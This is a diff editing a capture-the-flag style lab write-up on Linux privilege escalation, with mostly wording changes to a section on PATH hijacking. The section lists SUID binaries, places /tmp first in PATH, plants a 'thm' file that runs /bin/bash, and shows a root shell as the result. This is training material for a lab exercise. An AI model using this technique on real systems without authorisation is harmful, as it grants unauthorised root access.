@@ -685,6 +685,7 @@ drwxr-xr-x 5 root root  4096 Jun 20  2021 ..
 find /home/murdoch -type f -perm -04000 -ls 2>/dev/null
    256346     20 -rwsr-xr-x   1 root     root        16712 Jun 20  2021 /home/murdoch/test
 ```
+* Contents of `thm.py` script.
 ```
 cat /home/murdoch/thm.py
 /usr/bin/python3
@@ -697,18 +698,18 @@ try:
 except:
 	sys.exit()
 ```
-* "test" file appears to be a compiled version of `thm.py' script.
+* "test" file appears to be compiled version of `thm.py` script.
 ```
 ./test
 sh: 1: thm: not found
 ```
-* No path defined for this script.
-* Machine will look in the PATH environment to find the executable and will execute the first one it finds.
-* Add the `/tmp` directory into the beginning of the PATH environment.
+* No path defined for script.
+* Linux will look in the PATH environment to find the executable and will execute the first one it finds.
+* Add `/tmp` directory into the beginning of the PATH environment.
 ```
 export PATH=/tmp:$PATH
 ```
-* Copy `/bin/bash` as “thm” under the `/tmp` folder.
+* Copy `/bin/bash` as "thm" under the `/tmp` folder.
 ```
 cd /tmp
 echo "/bin/bash" > thm
@@ -719,7 +720,7 @@ chmod 777 thm
 ls -l thm
 -rwxrwxrwx 1 karen karen 10 Feb 13 14:17 thm
 ```
-* "test" path file will run with root privileges.
+* `home\murdoch\test` file will run with root privileges as SUID bit set.
 ```
 cd /home/murdoch
 whoami
@@ -732,7 +733,5 @@ root
 id
 uid=0(root) gid=0(root) groups=0(root),1001(karen)
 ```
-* should elevate our privileges
-* 
 ## Privilege Escalation: NFS
 ## Capstone Challenge
